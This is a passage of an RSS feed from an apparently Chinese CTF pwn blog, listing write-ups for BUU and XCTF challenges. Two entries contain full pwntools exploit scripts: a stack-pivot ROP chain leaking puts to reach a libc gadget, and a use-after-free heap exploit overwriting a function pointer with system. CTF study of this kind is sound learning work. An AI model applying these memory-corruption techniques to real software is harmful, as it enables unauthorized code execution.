&lt;div class="wp-block-image">&lt;figure class="aligncenter size-large">&lt;img src="https://chujdk.github.io/usr/uploads/2020/12/QQ截图20201230161011.png" alt="" class="wp-image-882"/>&lt;/figure>&lt;/div>
&lt;!-- /wp:image -->
&lt;!-- wp:paragraph -->
&lt;p>就是这样的一个栈溢出而已，几乎没有保护，我们可以为所欲为。但是需要特殊处理，程序一直在跑流水灯&lt;/p></description></item><item><title>BUU-qctf_2018_stack2-WP</title><link>https://chujdk.github.io/wp/buu-qctf_2018_stack2-wp.html</link><pubDate>Tue, 29 Dec 2020 15:48:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-qctf_2018_stack2-wp.html</guid><description>&lt;!-- wp:paragraph -->
&lt;p>这道题是很明显的数组越界的漏洞，题目也给出了后门"hackhere"。于是自然的我考虑通过越界覆写return address实现ret2text。然后奇怪的没有任何作用。于是我看了一下退出时的行为&lt;/p></description></item><item><title>XCTF-easyfmt-WP</title><link>https://chujdk.github.io/wp/xctf-easyfmt-wp.html</link><pubDate>Tue, 29 Dec 2020 11:46:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-easyfmt-wp.html</guid><description>&lt;!-- wp:paragraph -->
&lt;p>easy是easy，但是特别麻烦。&lt;/p>
&lt;!-- /wp:paragraph -->
&lt;!-- wp:paragraph -->
&lt;p>简单的四步。&lt;/p>
&lt;!-- /wp:paragraph -->
&lt;!-- wp:image {"align":"center","id":870,"sizeSlug":"large","linkDestination":"none"} -->
&lt;div class="wp-block-image">&lt;figure class="aligncenter size-large">&lt;img src="https://chujdk.github.io/usr/uploads/2020/12/屏幕截图-2020-12-29-113841.png" alt="" class="wp-image-870"/>&lt;/figure>&lt;/div>
&lt;!-- /wp:image -->
&lt;!-- wp:paragraph -->
&lt;p>checkin没什么好办法，老老实实爆破，概率0.2，'0'-'4'都有可能&lt;/p></description></item><item><title>BUU-actf_2019_babystack-WP</title><link>https://chujdk.github.io/wp/buu-actf_2019_babystack-wp.html</link><pubDate>Tue, 29 Dec 2020 10:18:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-actf_2019_babystack-wp.html</guid><description>&lt;!-- wp:paragraph -->
&lt;p> 一道简单的通过leave栈迁移实现更长的rop链的题&lt;/p>
&lt;!-- /wp:paragraph -->
&lt;!-- wp:code -->
&lt;pre class="wp-block-code">&lt;code>#!/usr/bin/env python 
# coding=utf-8 
from pwn import * 
from LibcSearcher import * 
pop_rdi_ret = 0x400ad3 
context(log_level = 'debug') 
 
sh = remote("node3.buuoj.cn","28568") 
#sh = process("./ACTF_2019_babystack") 
elf = ELF("./ACTF_2019_babystack") 
libc = ELF("./buu-libc-2.23.so") 
sh.sendlineafter("e?\n>",str(0xE0)) 
sh.recvuntil("at ") 
stackaddr = int(sh.recvuntil("\n",drop = True),base = 16) 
payload = 'fillfill' + p64(pop_rdi_ret) + p64(elf.got["puts"])
payload += p64(elf.symbols["puts"]) + p64(0x400800) 
payload = payload.ljust(0xD0,'a') 
payload += p64(stackaddr) + p64(0x400A18) 
sh.sendafter('>',payload) 
sh.recvuntil("e~\n") 
puts_addr = u64(sh.recvuntil('\n',drop = True).ljust(8,'\x00'))
LIBC = LibcSearcher('puts',puts_addr) 
base = puts_addr - LIBC.dump('puts') 
print base 
 
sh.sendlineafter("e?\n>",str(0xE0)) 
sh.recvuntil("at ") 
stackaddr = int(sh.recvuntil("\n",drop = True),base = 16) 
payload = 'a' 
payload = payload.ljust(0xD8,'a') 
payload += p64(base + 0x10a38c) 
sh.sendafter('>',payload) 
 
sh.interactive() &lt;/code>&lt;/pre>
&lt;!-- /wp:code -->
&lt;!-- wp:paragraph -->
&lt;p>和&lt;a href="https://chujdk.github.io/?p=789">此题&lt;/a>类似&lt;/p></description></item><item><title>BUU-actf_2019_babyheap-WP</title><link>https://chujdk.github.io/wp/buu-actf_2019_babyheap-wp.html</link><pubDate>Mon, 28 Dec 2020 17:45:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-actf_2019_babyheap-wp.html</guid><description>&lt;!-- wp:paragraph -->
&lt;p>此题和&lt;strong>&lt;a href="https://chujdk.github.io/?p=722">BUU&amp;XCTF-hitcontraining_uaf-WP&lt;/a>&lt;/strong>很像，都是UAF，漏洞的原因也很像，漏洞点是&lt;/p>
&lt;!-- /wp:paragraph -->
&lt;!-- wp:image {"align":"center","id":860,"sizeSlug":"large","linkDestination":"none"} -->
&lt;div class="wp-block-image">&lt;figure class="aligncenter size-large">&lt;img src="https://chujdk.github.io/usr/uploads/2020/12/QQ截图20201228174146.png" alt="" class="wp-image-860"/>&lt;/figure>&lt;/div>
&lt;!-- /wp:image -->
&lt;!-- wp:code -->
&lt;pre class="wp-block-code">&lt;code>#!/usr/bin/env python 
# coding=utf-8 
from pwn import * 
context(log_level = 'debug') 
 
#sh = process('./ACTF_2019_babyheap') 
sh = remote("node3.buuoj.cn","26759") 
elf = ELF('./ACTF_2019_babyheap') 
 
def create(size,payload): 
 sh.sendlineafter("Your choice: ",'1') 
 sh.sendlineafter("Please input size: \n",str(size)) 
 sh.sendafter("Please input content: \n",payload) 
 
def delete(index): 
 sh.sendlineafter("Your choice: ",'2') 
 sh.sendlineafter("Please input list index: \n",str(index)) 
 
def print_this(index): 
 sh.sendlineafter("Your choice: ",'3') 
 sh.sendlineafter("Please input list index: \n",str(index)) 
 
create(0x200,'index:0') 
create(0x200,'index:1') 
delete(0) 
delete(1) 
 
create(0x10,p64(0x602010) + p64(elf.symbols["system"])) 
print_this(0) 
sh.interactive() &lt;/code>&lt;/pre>
&lt;!-- /wp:code -->
&lt;!-- wp:paragraph -->
&lt;p>exp很简单，要注意需要申请两个堆块再都free掉，这样fast bin中才会有两个payload大小为0x10的chunk，再申请的时候才能获得对index为0的content的输出函数指针的修改能力。&lt;/p></description></item><item><title>XCTF-4-reehy-main-100-WP</title><link>https://chujdk.github.io/wp/xctf-4-reehy-main-100-wp.html</link><pubDate>Sun, 27 Dec 2020 21:13:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-4-reehy-main-100-wp.html</guid><description>&lt;!-- wp:paragraph -->
&lt;p>这道题好难的感觉，看了别人的WP做了一天虽然是迷迷糊糊的拿到了flag但是还是有一点不能理解（2021.1.3更新：由于libc的问题被解决，现在基本理解了，如果你也和我一样对最后伪造的两个堆块的大小不理解那么希望这篇文章能帮到你）。&lt;/p></description></item><item><title>XCTF-supermarket-WP</title><link>https://chujdk.github.io/wp/xctf-supermarket-wp.html</link><pubDate>Fri, 25 Dec 2020 23:11:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-supermarket-wp.html</guid><description>&lt;!-- wp:paragraph -->
&lt;p>写在前面：这篇WP很简陋，我只写了重点&lt;/p>
&lt;!-- /wp:paragraph -->
&lt;!-- wp:paragraph -->
&lt;p>堆的利用我也开始一步步的开始“上道”了，这是一道比较简单的堆溢出，主要的难点是程序比较复杂，分析比较麻烦（毕竟我没经历过逆向的洗礼）。&lt;/p></description></item></channel></rss>